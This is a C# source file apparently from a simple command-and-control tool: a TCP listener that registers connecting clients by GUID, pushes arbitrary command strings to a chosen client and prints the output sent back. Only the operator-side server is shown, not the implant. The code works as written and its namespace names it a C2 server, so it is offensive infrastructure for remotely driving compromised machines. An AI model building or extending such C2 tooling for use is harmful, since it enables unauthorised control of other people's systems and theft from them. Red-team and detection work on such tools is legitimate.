using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace RFC_SimpleRunspaceC2_Server
{
    internal class TCPServer
    {
        TcpListener tcpListener;
        bool running = false;

        private static Dictionary<string, TcpClient> clients = new Dictionary<string, TcpClient>();
        public TCPServer(int port)
        {
            IPAddress localAddr = IPAddress.Any;
            tcpListener = new TcpListener(localAddr, port);
        }

        public void Start()
        {
            running = true;
            tcpListener.Start();
            //Console.WriteLine($"[i] Server started on port {((IPEndPoint)tcpListener.LocalEndpoint).Port}");

            while (running)
            {
                TcpClient client = tcpListener.AcceptTcpClient();
                string clientId = Guid.NewGuid().ToString();
                clients[clientId] = client;
                Console.WriteLine($"[+] Client connected: {((IPEndPoint)client.Client.RemoteEndPoint).ToString()} - {clientId}");
            }
        }

        private void Stop()
        {
            running = false;
            tcpListener.Stop();
            Console.WriteLine("[!] Server has stopped!!");
        }

        public void SendCommand(string clientId, string command)
        {
            TcpClient client = clients[clientId];
            try
            {
                NetworkStream stream = client.GetStream();
                Byte[] bytes = new Byte[1024];

                // send data
                byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                stream.Write(commandBytes, 0, commandBytes.Length);

                // receive data
                byte[] buffer = new byte[client.ReceiveBufferSize];
                int bytesRead = stream.Read(buffer, 0, buffer.Length);
                string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                Console.WriteLine(data);
            }
            catch (Exception)
            {
                Console.WriteLine($"[+] Client disconnected: {clientId}");
                clients.Remove(clientId);
                client.Close();
            }

        }

        public void CloseClient(string clientId)
        {
            if (clients.ContainsKey(clientId))
            {
                TcpClient client = clients[clientId];
                client.Close();
                clients.Remove(clientId);
            }
            else
            {
                Console.WriteLine("[!] Invalid clientId!!");
            }

        }

        public Dictionary<string, TcpClient> GetClients()
        {
            return clients;
        }

    }
}
